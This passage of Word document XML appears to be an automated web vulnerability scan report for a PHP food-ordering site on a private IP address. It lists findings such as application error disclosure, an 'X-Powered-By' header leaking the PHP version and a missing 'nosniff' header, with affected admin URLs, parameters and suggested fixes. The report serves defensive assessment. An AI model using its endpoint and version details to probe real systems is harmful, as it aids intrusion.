        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="37EDB76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3CEB2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BAF1CB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4FD5CC0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5A1CE4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B74185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5CA2239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8019C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Attack</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="50CCD2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t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="1FF12AD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33B67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8FA288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0307076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205609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35806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305FA2A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FB3F8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654DA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7A1B47D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FF05B9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Parameter</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="22F708D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login</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="0C7ABFF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3A1041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326A45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47D2604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C227E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267812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http://192.168.1.20/admin/staff-exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="29A6183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CC362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E9733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28568F4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FAC6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6AF262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sAddress</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="30BFB02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BC2DD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DC885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09FA782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4D591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045347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http://192.168.1.20/admin/staff-exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="3AC9B22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8E0F9A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9D5D14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630A8D8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6C498E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F2B814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fName</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="2CD515C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6E54C7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5B431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56E21B5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5B1E2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438820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http://192.168.1.20/admin/staff-exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="57FAA49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B3ED0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3C497A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11C500F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588A3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5F70D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mobile</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="27CB8B9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DC3931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2EFE25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60998F7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6B6BA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B275FF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http://192.168.1.20/update-quantity.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="7BD6B74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E2201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9ACF8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6C8B83E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741D9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434E6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quantity</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="1A4F3D9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F515B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F2ADC3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019FEB0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CFA9D4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56F80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http://192.168.1.20/admin/staff-exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="743DCA7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F088CA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608374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38B103E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18CA34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0B618E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lName</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="6D00B59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F0872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B7EDD6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2293465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F44829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25359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http://192.168.1.20/attachment.php?=</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="5784E85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6FE2E8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04BD05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DF3492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0D1E45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F31A0D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type</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="2E3BDF5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949D46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066439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7F2268F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9F393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079E3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14489E9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6223C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A6B5F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34DF9E7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0F9A8E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4D184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password</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="5F1D07C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1CFCCD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BF347F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7C17C4A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7C14D5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DC0E4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http://192.168.1.20/foodzone.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="146A6F0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6E1000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0CA1A9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75885AD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232B3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E17E3B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category</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="1335D22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B10F4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488126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on line &lt;b&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="0EEA043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2CCF8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5C60F6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12</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="5E01F7B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2AFE28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Solution</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="70934D1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Identify the cause of the error and fix it. Do not trust client side input and enforce a tight check in the server side. Besides, catch the exception properly. Use a generic 500 error page for internal server error.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="1A640C8E"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C8A4C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30B13C53" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRPr="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="741AA00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B42533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0A8039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472</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="5239DA7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C79749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1A79EB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20</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="5CE8152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07EAA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666C1E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bl>
    <w:p w14:paraId="4E80DE26"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bookmarkStart w:id="78" w:name="low"/>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0EC0332E" w14:textId="77777777" w:rsidTr="00DA102C">
        <w:trPr>
          <w:trHeight w:val="360"/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="40D7353E"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Low (Medium)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1B225268"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Server Leaks Information via "X-Powered-By" HTTP Response Header Field(s)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="235CA25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E78258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62459B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web/application server is leaking information via one or more "X-Powered-By" HTTP response headers. Access to such information may facilitate attackers identifying other frameworks/components your web application is reliant upon and the vulnerabilities such components may be subject to.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="54A00124" w14:textId="77777777" w:rsidTr="00DA102C">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:gridSpan w:val="2"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="33CCD8A5" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRPr="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="480539B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9589B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759B8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http://192.168.1.20/order-exec.php?id=797</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="0EF8ECA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B83EE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F6A60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3BBEFB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E9A922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AE524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5BF0852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BE7F9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D4F07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http://192.168.1.20/order-exec.php?id=67</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="2A317F0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531633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2B80F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834C9B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7E41E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585C7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3809ED1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C2BB9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4825B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http://192.168.1.20/cart-exec.php?id=13</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="6D4A241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FD98F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852D8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483C53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05746C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F43BB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1D762203"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E30F7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7A0C3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http://192.168.1.20/order-exec.php?id=796</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="6A86266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80398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D08829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798E20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77C37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37A584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3B57E85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F23D84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D2DA67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http://192.168.1.20/cart-exec.php?id=14</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="18DE74C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67831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BFDF6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9EF743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9331F2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940119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48C956C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24A62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AA576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http://192.168.1.20/admin/delete-food.php?id=19</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="17455E9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F12DE8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1EF601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84D7C3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B4AAE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B1D262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7D24514B"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FA204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5A670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http://192.168.1.20/index.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="074DE0A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54FB68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E199A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20F999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1AFB8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D4097E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6972448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B84CDB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0D4A9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http://192.168.1.20/order-exec.php?id=799</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="4AC09FE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FBADC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E98109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AA6C2F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AC467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BB2EF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7623539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A929E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URL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="75C7340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http://192.168.1.20/admin/delete-member.php?id=19</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="72D5E1C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44BD0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B86F0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2A1F40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43912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5240A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6A05A8E3"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A1C8F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4B760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http://192.168.1.20/admin/delete-member.php?id=18</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="12CD97D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62D01F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7B0C04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3C533F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44725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8828F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41FFB74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F6796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3F6113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http://192.168.1.20/update-quantity.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="3CC8C36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A2838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409889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B068FC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CFDC8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EF513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70BB4BA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5C5632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079EE6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http://192.168.1.20/order-exec.php?id=65</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="11B4FEE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51C0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74734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B66FEB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7A351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F6B88A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26388D2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9473A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C9A4AE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http://192.168.1.20/cart-exec.php?id=15</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="04CB777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28C20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4C5013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BA6562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CB3C33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754CF6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42C1469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743C99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E98B0B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http://192.168.1.20/cart-exec.php?id=17</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="2B8545F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BBEA39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B95C3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24AEA7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2D930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13110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59B9084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F1162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909D8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http://192.168.1.20/order-exec.php?id=798</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="6091E0C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806D0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BE2A2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E24AC2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768007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BE793F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1CC39AA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FEBF3F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9FBD2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http://192.168.1.20/order-exec.php?id=66</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="6EF3AFF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711AF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C93D8D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4E818B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5B25F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6F7A0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1831017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709532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BC74F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http://192.168.1.20/cart-exec.php?id=16</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="6D5F790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B12E8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F77435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494E90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2B22D1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878FD2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1ACE80F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FBBDD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5376F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http://192.168.1.20/order-exec.php?id=63</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="67C2E33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F3551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B91E9C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2AC4CA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A949A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204F15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52FF158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705BB2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1E96CC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http://192.168.1.20/order-exec.php?id=793</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="552E2F2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EEA23A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766935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01C312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7D352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10035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15B3A51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4970D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1F16B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http://192.168.1.20/admin/delete-food.php?id=17</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="34BE0B8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7D24C4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9C564E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23BE7D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CDFB2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Evidence</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6E2A27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X-Powered-By: PHP/5.6.34</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="1B20DB8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F3B30E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0CCFCE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258</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="640F028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691DD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34F2DC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that your web server, application server, load balancer, etc. is configured to suppress "X-Powered-By" headers.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="545150D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EE056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6F6AD53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http://blogs.msdn.com/b/varunm/archive/2013/04/23/remove-unwanted-http-response-headers.aspx</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="70825D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http://www.troyhunt.com/2012/02/shhh-dont-let-your-response-headers.html</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="3ED79EA9"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E9797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2893881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200</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="023D619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0EE92D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0B84D7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13</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="066F6C3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7D64A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42F9DB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7B975BFC"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4F34F4C0" w14:textId="77777777" w:rsidTr="00DA102C">
        <w:trPr>
          <w:trHeight w:val="360"/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="78B0C2DC"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Low (Medium)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="30307CEA"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X-Content-Type-Options Header Missing</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="0791D02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D9E38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79DBFD5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Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'.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tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="0BFA8686" w14:textId="77777777" w:rsidTr="00DA102C">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:gridSpan w:val="2"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7FEB9686" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRPr="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="3975CC5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5076F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9443A1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http://192.168.1.20/admin/specials.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="1279ACB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72CF7B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328776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13F8E6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0E3E3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1A77B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2335E64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E4621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38CFF9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http://192.168.1.20/icons/blank.gif</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="168D0A0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5CEE7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D8230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1BB1C5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BC69D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DA6C40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07F774C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23AAFE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07B5EF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http://192.168.1.20/images/?C=S;O=A</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="398DBFD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B48264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9F2254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02D2AE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E05257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67A62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38F3A57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FD32D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3798B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http://192.168.1.20/contactus.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="5DDBB99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61F6FB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F0E97A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A121B3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16C39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FD504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5445644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3AAFD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1D570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http://192.168.1.20/validation/?C=S;O=A</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="130DD6C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525AB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13AAD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B53CCA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4F5E2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7EC9D1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42BE58C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8DE22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CE5B0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http://192.168.1.20/js/bootstrap.js</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="52EA441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B60FCD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2D0E4E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6B4BB9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043F06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96AF13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08FD2C6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E8DC50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FCCA5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http://192.168.1.20/admin/foods.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="2B1E6E0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39E23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4B627B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3C5B94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96FAE2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C78DD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2DE7B29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361CC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URL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="09EB96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w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="4A1BD53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CBBCE4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BE48D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885171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8CEFD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7F0B6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23C868D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4D2DB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82EBA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http://192.168.1.20/images/pizza/?C=S;O=D</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="0258CC0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A6B77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7D21AB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67AE66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39917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328FCE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058F0EE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3E52D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A1C950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http://192.168.1.20/images/pizza/img024.png</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="64E7C9A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C3BA5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746744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4F5A9E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B2F90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AC8D08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509E867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F85013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C8BF7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http://192.168.1.20/admin/allocation.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="1D7FDC9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C98E2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041204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69A6FC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D3E91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46B61F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5038072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DBE71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E1B81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http://192.168.1.20/images/pizza/img007.png</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="2A12508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077083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181C29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44AA6D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BA81D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B87D03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405EFB4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EEE70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C6095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http://192.168.1.20/images/pizza/?C=D;O=D</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="42F0CA2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6DB13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D82833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0590FB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88B0C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8F1D3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6B0EB32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3BC97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5196A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http://192.168.1.20/pictures/fluffy.jpg</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="24E89E6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DFADFB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C654A8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CD29E8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B11468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0CABD7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1BE00DA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7193C6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E2FD3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http://192.168.1.20/images/?C=S;O=D</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="3DEE724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D78418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97739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A22B64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FA3FD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13144A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7DE178BB"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0B750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39749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http://192.168.1.20/images/img016.png</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="2F18BEB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DE19A6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2ECBC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8CED57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586A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1E8BE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06728B7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1DFA4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BC3ED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http://192.168.1.20/GTIGCCGDCCFM/?C=S;O=D</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="50340E8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35D49C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CE4CA5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E7D872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1F1CF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5CA76FE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06565F2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0B5C1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7BADA5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http://192.168.1.20/images/img025.png</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="2B51797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A8CE2B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9E32D6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7C488A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FAED60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154A8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161F7CD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9BB8BB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AEBE0E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http://192.168.1.20/billing-alternative.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="71A9FC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1063C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73970D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0FD889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146079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Parameter</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="169D06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132B1C0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96E1C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04F74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http://192.168.1.20/validation/?C=D;O=A</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="66BBD57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7DE360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2CB27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D799E1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EF8A3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393F06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X-Content-Type-Options</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="62C2C8C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DB2C4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5E39998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208</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="114CB5B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59E19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7D3C39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that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0A80FBE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If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="2DE8C2E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6E518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Other information</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5DE16F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This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2C78B5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At "High" threshold this scanner will not alert on client or server error responses.</w:t>
            </w:r>
          </w:p>
        </w:tc>
